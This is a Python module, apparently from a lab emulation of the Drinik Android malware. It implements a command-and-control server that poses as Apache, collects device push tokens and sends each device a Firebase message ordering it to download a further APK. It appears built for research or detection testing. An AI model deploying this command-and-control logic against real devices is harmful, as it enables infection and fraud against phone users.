from __future__ import annotations

import json
import queue
import ssl
import threading
import time
import urllib.parse
from dataclasses import dataclass
from http.server import BaseHTTPRequestHandler

from .config import LabConfig
from .dns_client import DnsResolver
from .http_server_base import ManagedHttpServer
from .http_wire import send_http_request
from .logging_utils import log


@dataclass
class C2State:
    config: LabConfig
    resolver: DnsResolver
    tls_context: ssl.SSLContext
    token_queue: "queue.Queue[str]"
    stop_event: threading.Event


class C2Handler(BaseHTTPRequestHandler):
    server_version = "Apache/2.4.54"
    sys_version = ""

    def do_POST(self) -> None:  # noqa: N802
        state: C2State = self.server.state
        length = int(self.headers.get("Content-Length", "0"))
        raw = self.rfile.read(length).decode("utf-8", errors="replace")
        params = urllib.parse.parse_qs(raw, keep_blank_values=True)
        flat = {key: values[0] if values else "" for key, values in params.items()}
        cmd = flat.get("CMD", "")
        log("c2", f"POST {self.path} CMD={cmd} body={raw}")

        if self.path != state.config.c2_path:
            self._send_text(404, "Not Found")
            return

        if cmd == "Token":
            token = flat.get("Token", "")
            if token:
                state.token_queue.put(token)
            self._send_text(200, "OK")
            return

        if cmd == "insertServerCMD":
            log("c2", f"insertServerCMD ServerCMD={flat.get('ServerCMD', '')}")
            self._send_text(200, "OK")
            return

        self._send_text(200, "OK")

    def log_message(self, _format: str, *_args: object) -> None:
        return

    def _send_text(self, status: int, body: str) -> None:
        payload = body.encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)


class C2Server:
    def __init__(
        self,
        config: LabConfig,
        resolver: DnsResolver,
        tls_context: ssl.SSLContext,
        stop_event: threading.Event,
    ) -> None:
        self.config = config
        self.token_queue: "queue.Queue[str]" = queue.Queue()
        self.state = C2State(config, resolver, tls_context, self.token_queue, stop_event)
        self.server = ManagedHttpServer(
            name="c2",
            ip=config.c2.ip,
            port=config.c2.port,
            handler_cls=C2Handler,
        )
        self.server.httpd.state = self.state
        self.operator_thread = threading.Thread(target=self._operator_loop, name="c2-operator", daemon=True)

    def start(self) -> None:
        self.server.start()
        self.operator_thread.start()

    def stop(self) -> None:
        self.server.stop()

    def _operator_loop(self) -> None:
        while not self.state.stop_event.is_set():
            try:
                token = self.token_queue.get(timeout=0.2)
            except queue.Empty:
                continue
            time.sleep(self.config.command_delay_seconds)
            command = f"DOWNLOADAPK:::http://{self.config.download.host}{self.config.download_path}"
            self._send_fcm_command(token, command)

    def _send_fcm_command(self, token: str, command: str) -> None:
        body = json.dumps(
            {
                "message": {
                    "token": token,
                    "data": {
                        "CMD": command,
                    },
                }
            },
            separators=(",", ":"),
        ).encode("utf-8")
        ip = self.state.resolver.resolve_a(self.config.fcm_api_host)
        log("c2", f"FCM messages:send token={token} data.CMD={command}")
        response = send_http_request(
            ip=ip,
            port=self.config.firebase_api.port,
            host=self.config.fcm_api_host,
            method="POST",
            path=self.config.fcm_send_path,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "DrinikPanel/1.0",
            },
            body=body,
            timeout=self.config.timeout_seconds,
            tls=True,
            tls_context=self.state.tls_context,
        )
        log("c2", f"FCM ACK HTTP {response.status} {response.text.strip()}")

